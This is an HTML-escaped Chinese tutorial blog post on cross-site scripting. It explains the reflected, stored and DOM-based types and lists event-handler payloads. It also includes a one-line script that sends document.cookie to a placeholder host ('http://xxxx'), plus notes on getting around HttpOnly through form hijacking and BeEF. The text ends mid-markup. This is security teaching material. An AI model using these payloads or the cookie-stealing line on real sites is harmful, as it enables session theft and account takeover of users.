            <description><![CDATA[ &lt;h1 id=&#34;xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h1&gt;
&lt;h2 id=&#34;跨站脚本攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#跨站脚本攻击&#34;&gt;#&lt;/a&gt; 跨站脚本攻击&lt;/h2&gt;
&lt;p&gt;网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web 应用程序能够输出相应的内容。动态站点会受到一种名为 “跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成 XSS, 原本应当是 css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称 XSS，而静态站点则完全不受其影响。XSS 的运行原理是将恶意的 script 脚本插入进 html/css/js 文件当中，恶意攻击者会在 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。&lt;/p&gt;
&lt;p&gt;跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用 xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和 cookie 等各种内容&lt;/p&gt;
&lt;p&gt;攻击者利用 XSS 漏洞旁路掉访问控制 —— 例如同源策略 (same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼 (Phishing) 攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的 “缓冲区溢出攻击”，而 JavaScript 是新型的 “ShellCode”。&lt;/p&gt;
&lt;p&gt;xss 漏洞通常是通过 php 的输出函数将 javascript 代码输出到 html 页面中，通过用户本地浏览器执行的，所以 xss 漏洞关键就是&lt;strong&gt;寻找参数未过滤的输出函数。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例如以下代码：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$xss&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;x&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$xss&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;代码未对可控制参数做任何过滤，此时就可以利用 x 构建恶意 js 代码获取一定的信息，测试一下 &lt;code&gt;?x=&amp;lt;script&amp;gt;alert(1)&amp;lt;script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此时是页面会弹出 &lt;code&gt;1&lt;/code&gt; ：&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/sXjQ6w35zbWBAut.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;xss 漏洞一般是在前端，对用户输入的内容缺少过滤，当用户构造恶意的 script 语句时，就有可能泄露信息，用户可以利用 php 中的输出函数（常见的输出函数有： &lt;code&gt;print&lt;/code&gt; 、 &lt;code&gt;print_r&lt;/code&gt; 、 &lt;code&gt;echo&lt;/code&gt; 、 &lt;code&gt;printf&lt;/code&gt; 、 &lt;code&gt;sprintf&lt;/code&gt; 、 &lt;code&gt;die&lt;/code&gt; 、 &lt;code&gt;var_dump&lt;/code&gt; 、 &lt;code&gt;var_export&lt;/code&gt; ）来获取敏感信息&lt;/p&gt;
&lt;p&gt;危害影响：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号&lt;/li&gt;
&lt;li&gt;控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力&lt;/li&gt;
&lt;li&gt;盗窃企业重要的具有商业价值的资料&lt;/li&gt;
&lt;li&gt;非法转账&lt;/li&gt;
&lt;li&gt;强制发送电子邮件&lt;/li&gt;
&lt;li&gt;网站挂马&lt;/li&gt;
&lt;li&gt;控制受害者机器向其它网站发起攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;其实归根结底，XSS 的攻击方式就是想办法 “教唆” 用户的浏览器去执行一些这个网页中原本不存在的前端代码。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在 XSS 中除非恶作剧，不然是不会在恶意植入代码中写上 alert (“say something”) 的。在真正的应用中，XSS 攻击可以干的事情还有很多&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 窃取网页浏览中的 cookie 值&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个 cookie 值。这个 cookie 值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的 cookie 值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过 script 脚本获得当前页面的 cookie 值，通常会用到 cookie&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 劫持流量实现恶意跳转&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个很简单，就是在网页中想办法插入一句像这样的语句： &lt;script&gt;window.location.href=“&lt;a class=&#34;link&#34;   href=&#34;http://www.baidu.com&#34; &gt;http://www.baidu.com &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;”;&lt;/script&gt;那么所访问的网站就会被跳转到百度的首页。早在 2011 年新浪就曾爆出过严重的 xss 漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。&lt;/p&gt;
&lt;p&gt;常出现场景：文章发表、评论、留言、注册资料的地方、修改资料的地方等&lt;/p&gt;
&lt;p&gt;XSS 可以分为反射型、存储型、DOM 型&lt;/p&gt;
&lt;h3 id=&#34;反射型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反射型xss&#34;&gt;#&lt;/a&gt; 反射型 XSS&lt;/h3&gt;
&lt;p&gt;非持久化&lt;/p&gt;
&lt;p&gt;（1）原理&lt;br&gt;
  反射型 xss 又称非持久型 xss，是目前最普遍的类型，这种攻击方式往往具有一次性，危害相对较小，但是方便攻击者构造。发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务器端，服务器端解析后响应，XSS 代码随响应内容一起传回给浏览器，最后浏览器解析执行 XSS 代码。这个过程像一次反射，所以称反射型 XSS。&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/HRqcBeglPQzE4hF.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;（2）攻击方式&lt;br&gt;
  攻击者通过电子邮件等方式将包含 xss 代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有 xss 代码的数据发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后就会触发 xss 漏洞&lt;/p&gt;
&lt;p&gt;在判断是否有能利用的 XSS 时，一般需要判断网站过滤了什么字符，然后进行代码注入：&lt;br&gt;
面对输入框，先输入 &lt;code&gt;1&lt;/code&gt; :&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/JTeYCBVtnUSkmau.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后查看源代码，找到输入的 &lt;code&gt;1&lt;/code&gt;  出现在什么地方：&lt;br&gt;
&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/FkWQ7DNZUM1KVHA.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;插入代码： &lt;code&gt;&amp;quot;&amp;gt;&amp;lt;img src=1 onerror=&amp;quot;alert(/xss/)&amp;quot;/&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/xBlZRjIoMrLXdSp.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;注入成功；&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;img src=1 onerror=&amp;quot;alert(/xss/)&amp;quot;/&amp;gt;&lt;/code&gt;  中 &lt;code&gt;&amp;quot;&amp;gt;&lt;/code&gt;  闭合了前面的语句，后面 &lt;code&gt;&amp;lt;img src=1 onerror=&amp;quot;alert(/xss/)&amp;quot;/&amp;gt;&lt;/code&gt;  是实际利用漏洞达到目的的语句&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/Djbq3zoIdWvgwyY.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;存储型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存储型xss&#34;&gt;#&lt;/a&gt; 存储型 XSS&lt;/h3&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/v8CzH1lJwTtGfe7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;（1）原理&lt;br&gt;
  存储型 XSS 和反射型 XSS 的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交 XSS 代码，会长期存在并有效。最典型的例子就是留言板 XSS，用户提交一条包含 XSS 代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了 XSS 攻击&lt;/p&gt;
&lt;p&gt;（2）攻击方式&lt;br&gt;
  这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行&lt;/p&gt;
&lt;h3 id=&#34;dom型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dom型xss&#34;&gt;#&lt;/a&gt; DOM 型 XSS&lt;/h3&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/djA6KrPy3e4OtcU.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;（1）原理&lt;br&gt;
  文档对象模型 Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分&lt;/p&gt;
&lt;p&gt;DOM 型 xss 其实是一种特殊类型的反射型 xss，也被称作本地跨站，它是基于 DOM 文档对象模型的一种漏洞。DOM XSS 和反射型 XSS、存储型 XSS 的区别在于 DOM XSS 代码并不需要服务器参与，出发 XSS 靠的是浏览器的 DOM 解析，完全是客户端的事情&lt;/p&gt;
&lt;p&gt;DOM 中有很多对象，其中一些对象可以被用户所操纵，如 url，location 等。客户端的脚本程序可以通过 DOM 来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得 DOM 中的数据后并在本地执行，因此仅从服务器端是没有办法防御 DOM 型 XSS 漏洞的，如若 DOM 中的数据没有经过严格的验证，便会产生基于 DOM 的 XSS 漏洞。&lt;/p&gt;
&lt;p&gt;基于 DOM 的 XSS 是反射的特例，其中 JavaScript 隐藏在 URL 中，并在其呈现时由页面中的 JavaScript 取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的 WAF 或其他防护检测不出恶意内容。&lt;/p&gt;
&lt;p&gt;（2）攻击方式&lt;br&gt;
  用户请求一个经过专门设计的 URL，它由攻击者提交，而且其中包含 xss 代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM 对象就会处理 xss 代码，导致存在 xss 漏洞&lt;/p&gt;
&lt;h3 id=&#34;使用js代码获取cookie&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用js代码获取cookie&#34;&gt;#&lt;/a&gt; 使用 JS 代码获取 Cookie&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; img=&lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;createElement&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;img&amp;quot;&lt;/span&gt;);img.&lt;span class=&#34;property&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://xxxx/a?&amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;escape&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;cookie&lt;/span&gt;);&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;获取session&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获取session&#34;&gt;#&lt;/a&gt; 获取 session&lt;/h3&gt;
&lt;p&gt;有的时候获取了 Cookie，但是少了 Session，会造成登不进后台，服务器开启了 Session 验证的话，我们只获取客户端的 Cookie 是没有办法通过验证的，而且我们也无法获取存放在服务端的 Session。如果需要获取 Session，可以借助辅助文件，比如访问 php 探针时就会携带 Session&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/yRmvSg7rsHIXkQh.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;想办法进入 phpinfo ()&lt;/p&gt;
&lt;p&gt;利用 beef 进行页面跳转&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/UZmWoGfNuz64Sxd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;获取页面源码&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/jcwyR6NYOaZg7ld.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;httponly&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#httponly&#34;&gt;#&lt;/a&gt; HttpOnly&lt;/h3&gt;
&lt;p&gt;如果 Cookie 中设置了 HttpOnly 属性，那么通过 JS 脚本将无法读取到 Cookie 信息，这样能有效防止 XSS 攻击，窃取 Cookie 内容。 但是还是存在 xss 跨站语句，阻止的仅仅是获取 cookie&lt;/p&gt;
&lt;p&gt;各种主流语言都支持 HttpOnly&lt;/p&gt;
&lt;h3 id=&#34;反制httponly&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反制httponly&#34;&gt;#&lt;/a&gt; 反制 HttpOnly&lt;/h3&gt;
&lt;p&gt;当对方开启 HttpOnly 时，盗取 cookie 就会失败。登录后台的方式有 Cookie 登录和账号密码登录&lt;/p&gt;
&lt;p&gt;（1）Cookie 形式&lt;br&gt;
（2）直接账号密码登录&lt;/p&gt;
&lt;p&gt;① 读取保存账号密码&lt;br&gt;
  通过窃取保存在本地的数据（账号密码）来登录后台（需要 xss 产生于登录地址，利用表单劫持）&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/gBu43eYEGRdqSVX.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;type、id、name 通过查看网站源代码中的登录框表单&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/hk6GDgcZiR5MU49.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;② 读取没保存账号密码&lt;/p&gt;
&lt;p&gt;通过表单（登录框）劫持数据（产生在后台的 XSS，例如存储型 XSS 留言等）&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/Csrn7KIPulTvi5M.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;劫持原理：抓取数据包另外发送一份到跨站平台&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/15/ELwHWCM3kAbQiTl.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是如果是 https 网站的话，数据是进行了 ssl 加密，获取了数据之后也是很难读取到账号密码的，鸡肋方法&lt;/p&gt;
&lt;h2 id=&#34;一些常见标签&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些常见标签&#34;&gt;#&lt;/a&gt; 一些常见标签&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;scirpt&lt;/span&gt;&amp;gt;&lt;/span&gt;alert(&amp;quot;xss&amp;quot;);&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;quot;&lt;span class=&#34;attr&#34;&gt;XSS&lt;/span&gt;&amp;quot;)&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onfocus&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;alert(&amp;#x27;xss&amp;#x27;);&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#竞争焦点，从而触发onblur事件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onblur&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;quot;&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;&amp;quot;) &lt;span class=&#34;attr&#34;&gt;autofocus&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;autofocus&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onfocus&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;alert(&amp;#x27;xss&amp;#x27;);&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;autofocus&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;details&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;details&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;ontoggle&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;alert(&amp;#x27;xss&amp;#x27;);&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#使用open属性触发ontoggle事件，无需用户去触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;details&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;ontoggle&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;alert(&amp;#x27;xss&amp;#x27;);&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;svg&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;svg&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onload&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(&lt;/span&gt;&amp;quot;&lt;span class=&#34;attr&#34;&gt;xss&lt;/span&gt;&amp;quot;);&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;select&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Html&#34;&gt;&lt;figure class=&#34;iseeu highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onfocus&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;alert(1)&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;select&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 